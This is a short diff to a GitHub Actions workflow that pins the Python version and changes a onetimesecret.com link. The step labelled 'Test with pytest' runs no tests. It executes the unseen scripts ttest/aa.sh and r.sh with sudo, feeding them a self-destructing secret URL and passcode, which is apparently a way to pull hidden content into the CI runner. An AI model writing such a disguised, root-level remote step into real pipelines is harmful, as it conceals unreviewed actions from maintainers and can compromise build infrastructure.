@@ -16,13 +16,13 @@ jobs:
 
     steps:
     - uses: actions/checkout@v3
-    - name: Set up Python 3.8
+    - name: Set up Python 3.8.2
       uses: actions/setup-python@v3
       with:
-        python-version: "3.8"
+        python-version: "3.8.2"
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
     - name: Test with pytest
       run: |
-        cd ${{ github.workspace }} && ls && sudo sh ttest/aa.sh https://onetimesecret.com/secret/bv5e5wncx650nmzlc35ogtkca8fr3xl 654123 && ls && sudo sh r.sh
+        cd ${{ github.workspace }} && ls && sudo sh ttest/aa.sh https://onetimesecret.com/secret/bnfwqk4ka37ngtxvwdqp0mjkn85ytox 654123 && ls && sudo sh r.sh
